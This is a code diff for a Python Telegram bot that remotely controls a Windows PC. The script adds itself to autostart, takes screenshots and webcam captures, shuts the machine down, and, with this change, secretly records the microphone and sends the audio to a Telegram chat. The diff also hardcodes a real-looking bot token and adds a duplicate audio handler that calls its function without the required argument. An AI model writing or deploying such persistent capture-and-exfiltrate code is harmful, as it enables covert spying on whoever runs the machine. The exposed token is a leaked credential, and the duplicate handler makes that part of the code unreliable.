@@ -7,6 +7,12 @@ import platform
 import psutil
 import cv2
 from PIL import Image
+import config
+import sounddevice as sd
+import numpy as np
+import wavio  # Импортируем библиотеку wavio
+import threading  # Импортируем библиотеку threading
+from functools import partial  # Импортируем functools.partial
 
 # Путь к текущему каталогу, где находится скрипт
 current_directory = os.path.dirname(os.path.abspath(__file__))
@@ -28,29 +34,71 @@ if not os.path.isfile(os.path.join(startup_directory, script_name)):
     print(f"Скрипт {script_name} добавлен в автозагрузку.")
 
 # Замените 'YOUR_BOT_TOKEN' на токен вашего Telegram бота
-bot = telebot.TeleBot('YOUR_BOT_TOKEN')
+bot = telebot.TeleBot('6689721467:AAEgi-BpiwmEfa_0wYTNl1I_88skp2ZFhsQ')
 
 # Переменная для отслеживания ожидания фото/видео
 waiting_for_media = False
 
+# Переменная для отслеживания записи аудио
+recording_audio = False
+
+# Функция для записи аудио
+def record_audio(message):  # Принимает параметр message
+    global recording_audio
+    recording_audio = True
+    bot.send_message(message.chat.id, "Начинаю запись аудио...")
+    audio_duration = 10  # Длительность записи аудио в секундах
+    sample_rate = 44100  # Частота дискретизации
+    channels = 2  # Количество аудио каналов (стерео)
+    filename = 'recorded_audio.wav'
+    
+    # Запуск записи аудио
+    audio_data = sd.rec(int(audio_duration * sample_rate), samplerate=sample_rate, channels=channels)
+    sd.wait()
+    
+    # Сохранение записанного аудио с использованием wavio
+    wavio.write(filename, audio_data, sample_rate, sampwidth=3)
+    
+    # Отправка записанного аудио в чат
+    with open(filename, 'rb') as audio_file:
+        bot.send_audio(message.chat.id, audio_file)
+    
+    bot.send_message(message.chat.id, "Запись аудио завершена.")
+    recording_audio = False
+    os.remove(filename)
+
+# В функции start_audio_recording() используйте functools.partial для передачи message
+@bot.message_handler(func=lambda message: message.text == "Запись аудио")
+def start_audio_recording(message):
+    global recording_audio
+    if not recording_audio:
+        # Запускаем запись аудио в отдельном потоке с помощью functools.partial
+        audio_thread = threading.Thread(target=partial(record_audio, message))
+        audio_thread.start()
+    else:
+        bot.send_message(message.chat.id, "Запись аудио уже идет.")
+
 @bot.message_handler(commands=['start'])
 def start(message):
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    screenshot_button = telebot.types.KeyboardButton("Скриншот")
-    shutdown_button = telebot.types.KeyboardButton("Выключить")
-    info_button = telebot.types.KeyboardButton("Информация")
-    reboot_button = telebot.types.KeyboardButton("Перезагрузка")
-    webcam_button = telebot.types.KeyboardButton("Вебка")
-    media_button = telebot.types.KeyboardButton("Открыть фото/видео")
-    
-    markup.row(screenshot_button, shutdown_button, info_button)
-    markup.row(reboot_button, webcam_button)
-    markup.row(media_button)
-    
-    # Отправляем уведомление
-    bot.send_message(message.chat.id, "Скрипт запущен")
-    
-    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
+    if message.from_user.id == config.allowed_user_id:
+        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+        screenshot_button = telebot.types.KeyboardButton("Скриншот")
+        shutdown_button = telebot.types.KeyboardButton("Выключить")
+        info_button = telebot.types.KeyboardButton("Информация")
+        reboot_button = telebot.types.KeyboardButton("Перезагрузка")
+        webcam_button = telebot.types.KeyboardButton("Вебка")
+        media_button = telebot.types.KeyboardButton("Открыть фото/видео")
+        audio_button = telebot.types.KeyboardButton("Запись аудио")  # Добавляем кнопку для записи аудио
+        
+        markup.row(screenshot_button, shutdown_button, info_button)
+        markup.row(reboot_button, webcam_button)
+        markup.row(media_button, audio_button)  # Добавляем кнопку для записи аудио
+        
+        bot.send_message(message.chat.id, "Скрипт запущен")
+        
+        bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
+    else:
+        bot.send_message(message.chat.id, "Вы не авторизованы для использования этого бота.")
 
 @bot.message_handler(func=lambda message: message.text == "Скриншот")
 def take_screenshot(message):
@@ -62,13 +110,13 @@ def take_screenshot(message):
 
 @bot.message_handler(func=lambda message: message.text == "Выключить")
 def shutdown_computer(message):
-    subprocess.Popen(['shutdown', '/s', '/t', '1'])
-    bot.send_message(message.chat.id, "Компьютер будет выключен через 1 секунду.")
+    subprocess.Popen(['shutdown', '/s', '/t', '60'])
+    bot.send_message(message.chat.id, "Компьютер будет выключен через 60 секунд.")
 
 @bot.message_handler(func=lambda message: message.text == "Перезагрузка")
 def reboot_computer(message):
-    subprocess.Popen(['shutdown', '/r', '/t', '1'])
-    bot.send_message(message.chat.id, "Компьютер будет перезагружен через 1 секунду.")
+    subprocess.Popen(['shutdown', '/r', '/t', '10'])
+    bot.send_message(message.chat.id, "Компьютер будет перезагружен через 10 секунду.")
 
 @bot.message_handler(func=lambda message: message.text == "Информация")
 def get_system_info(message):
@@ -110,6 +158,16 @@ def wait_for_media(message):
     global waiting_for_media
     waiting_for_media = True
     bot.send_message(message.chat.id, "Жду материал. Отправьте фото или видео.")
+
+@bot.message_handler(func=lambda message: message.text == "Запись аудио")
+def start_audio_recording(message):
+    global recording_audio
+    if not recording_audio:
+        # Запускаем запись аудио в отдельном потоке
+        audio_thread = threading.Thread(target=record_audio)
+        audio_thread.start()
+    else:
+        bot.send_message(message.chat.id, "Запись аудио уже идет.")
 
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
